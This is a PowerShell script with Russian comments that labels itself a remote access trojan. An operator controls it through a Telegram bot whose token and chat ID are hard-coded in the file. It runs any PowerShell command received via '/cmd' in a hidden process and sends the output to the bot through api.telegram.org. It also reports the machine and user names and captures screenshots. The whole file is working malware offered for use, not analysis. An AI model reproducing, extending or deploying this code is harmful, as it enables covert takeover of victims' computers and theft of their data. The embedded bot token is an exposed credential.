# Исправленный RAT для управления через Telegram бота
$token = "8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU"
$chatId = "8367594494"
$lastUpdateId = 0

# Функция для отправки сообщений с правильным кодированием
function Send-TelegramMessage {
    param($text)
    
    # Ограничиваем длину сообщения (Telegram имеет лимит)
    if ($text.Length -gt 4000) {
        $text = $text.Substring(0, 4000) + "... [сообщение обрезано]"
    }
    
    # Кодируем специальные символы
    $encodedText = [System.Web.HttpUtility]::UrlEncode($text)
    
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$encodedText"
    
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get
        return $true
    }
    catch {
        Write-Host "Ошибка отправки сообщения: $($_.Exception.Message)"
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $reader.BaseStream.Position = 0
            $reader.DiscardBufferedData()
            $responseBody = $reader.ReadToEnd()
            Write-Host "Детали ошибки: $responseBody"
        }
        return $false
    }
}

# Функция для получения обновлений
function Get-TelegramUpdates {
    $url = "https://api.telegram.org/bot$token/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get
        if ($response.ok) {
            return $response
        } else {
            Write-Host "Ошибка в ответе API: $($response.description)"
            return $null
        }
    }
    catch {
        Write-Host "Ошибка получения обновлений: $($_.Exception.Message)"
        return $null
    }
}

# Функция для выполнения команд
function Invoke-CommandHandler {
    param($command)
    try {
        # Создаем процесс для выполнения команды
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "powershell.exe"
        $processInfo.Arguments = "-Command `"$command`""
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        # Ждем завершения процесса
        $process.WaitForExit(30000) # 30 секунд таймаут
        
        # Получаем вывод
        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()
        
        if (-not [string]::IsNullOrEmpty($errorOutput)) {
            $output += "`nОшибки:`n$errorOutput"
        }
        
        return $output
    }
    catch {
        return "Ошибка выполнения команды: $($_.Exception.Message)"
    }
}

# Проверяем корректность токена и chatId перед началом работы
Write-Host "Проверка подключения к Telegram API..."
$testUrl = "https://api.telegram.org/bot$token/getMe"
try {
    $testResponse = Invoke-RestMethod -Uri $testUrl -Method Get
    if ($testResponse.ok) {
        Write-Host "Бот найден: $($testResponse.result.first_name) (@$($testResponse.result.username))"
        
        # Отправляем тестовое сообщение
        if (Send-TelegramMessage "RAT активирован на машине: $env:COMPUTERNAME ($env:USERNAME)") {
            Write-Host "Тестовое сообщение отправлено успешно!"
        }
    }
}
catch {
    Write-Host "Ошибка проверки бота: $($_.Exception.Message)"
    Write-Host "Убедитесь, что токен и chat ID указаны правильно"
    exit 1
}

# Основной цикл
Write-Host "Запуск основного цикла..."
while ($true) {
    $updates = Get-TelegramUpdates
    if ($updates -and $updates.ok -eq $true) {
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            
            if ($update.message.text -like "/cmd*") {
                $command = $update.message.text.Substring(4).Trim()
                Write-Host "Выполняю команду: $command"
                $output = Invoke-CommandHandler $command
                Send-TelegramMessage "Результат выполнения '$command':`n$output"
            }
            elseif ($update.message.text -eq "/screenshot") {
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                    
                    $tempFile = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                    $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
                    
                    $graphics.Dispose()
                    $bitmap.Dispose()
                    
                    Send-TelegramMessage "Скриншот сохранен: $tempFile"
                }
                catch {
                    Send-TelegramMessage "Ошибка создания скриншота: $($_.Exception.Message)"
                }
            }
            elseif ($update.message.text -eq "/help") {
                $helpMessage = @"
Доступные команды:
/cmd [command] - выполнить команду PowerShell
/screenshot - сделать скриншот
/help - показать справку
"@
                Send-TelegramMessage $helpMessage
            }
        }
    }
    Start-Sleep -Seconds 5
}